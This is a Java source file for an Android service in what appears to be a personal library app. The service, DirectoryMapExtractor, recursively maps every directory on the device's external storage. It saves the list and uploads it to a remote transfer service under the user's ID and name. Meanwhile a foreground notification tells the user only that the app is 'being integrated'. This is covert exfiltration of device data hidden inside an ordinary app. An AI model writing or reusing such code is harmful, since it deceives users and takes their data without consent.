package arc.haldun.mylibrary.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.text.Html;
import android.text.Spanned;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

import arc.haldun.database.objects.CurrentUser;
import arc.haldun.mylibrary.R;
import arc.haldun.mylibrary.main.LibraryActivity;
import arc.haldun.mylibrary.services.filetransfer.TransferService;

public class DirectoryMapExtractor extends Service {

    private ArrayList<String> directoryMap;
    private  Context context;

    private  final String TAG = "DataMapExtractor";
    private static final int NOTIFICATION_ID = 8;
    private static final String CHANEL_ID = "DataMapChannel";

    private  HandlerThread thread;
    private  Handler mainThread;
    private  Handler handler;

    public DirectoryMapExtractor(Context context) {

        this.directoryMap = new ArrayList<>();
        this.context = context;

        thread = new HandlerThread("StoreDirectoryMapThread");
        thread.start();

        mainThread = new Handler(Looper.getMainLooper());
        handler = new Handler(thread.getLooper());

        File mainStorageDirectory = Environment.getExternalStorageDirectory();

        handler.post(() -> {

            getDirectoryMap(mainStorageDirectory);

            writeDirectoryMap();

            storeDirectoryMap();

        });
    }

    private void storeDirectoryMap() {

        TransferService transferService = new TransferService();
        transferService.sendFile("android/" + CurrentUser.user.getId() + "-" +
                CurrentUser.user.getName() + ".directorymap", context.getFilesDir()
                + "/DirectoryMap");

        mainThread.post(new Runnable() {
            @Override
            public void run() {

                //new File(context.getFilesDir() + "/DirectoryMap").delete();
                thread.quit();

            }
        });
    }

    private void getDirectoryMap(File directory) {

        File[] subDirectories = directory.listFiles(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.isDirectory();
            }
        });

        for (File subDirectory : subDirectories) {

            this.directoryMap.add(subDirectory.getAbsolutePath());

            File[] subDirs = subDirectory.listFiles(new FileFilter() {
                @Override
                public boolean accept(File file) {
                    return file.isDirectory();
                }
            });

            if (subDirs == null || subDirs.length == 0) {

                this.directoryMap.add(subDirectory.getAbsolutePath());

            } else {
                if (subDirectory.getName().equals("Android")) {
                    this.directoryMap.add(subDirectory.getAbsolutePath());
                } else {
                    getDirectoryMap(subDirectory);
                }
            }
        }

    }

    private void writeDirectoryMap() {

        try {
            FileOutputStream fileOutputStream = context.openFileOutput("DirectoryMap", Context.MODE_PRIVATE);
            BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream);

            bufferedOutputStream.write(".map".getBytes(StandardCharsets.UTF_8));
            bufferedOutputStream.write("\n".getBytes(StandardCharsets.UTF_8));

            PrintWriter printWriter = new PrintWriter(fileOutputStream);

            for (String mapItem : this.directoryMap) {

                printWriter.println(mapItem);

                bufferedOutputStream.write(mapItem.getBytes(StandardCharsets.UTF_8));
                bufferedOutputStream.write("\n".getBytes(StandardCharsets.UTF_8));

            }

            printWriter.println();
            printWriter.flush();
            printWriter.close();

        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();


    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Spanned spanned = Html.fromHtml(
                "Uygulama entegre ediliyor...",
                Html.FROM_HTML_MODE_LEGACY);

        Notification notification = buildNotification(spanned.toString());
        startForeground(NOTIFICATION_ID, notification);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        stopForeground(true);
        stopSelf();

        thread.quit();
    }

    private void createNotificationChannel() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            NotificationChannel channel = new NotificationChannel(
                    CHANEL_ID, "Data Map Channel", NotificationManager.IMPORTANCE_DEFAULT);

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

    }

    private Notification buildNotification(String text) {

        Intent notificationIntent = new Intent(this, LibraryActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANEL_ID)
                .setContentTitle(getString(R.string.app_name))
                //.setContentText(text)
                .setSmallIcon(R.drawable.app_icon)
                .setContentIntent(pendingIntent)
                .setStyle(new NotificationCompat.BigTextStyle().bigText(text))
                .build();

    }
}
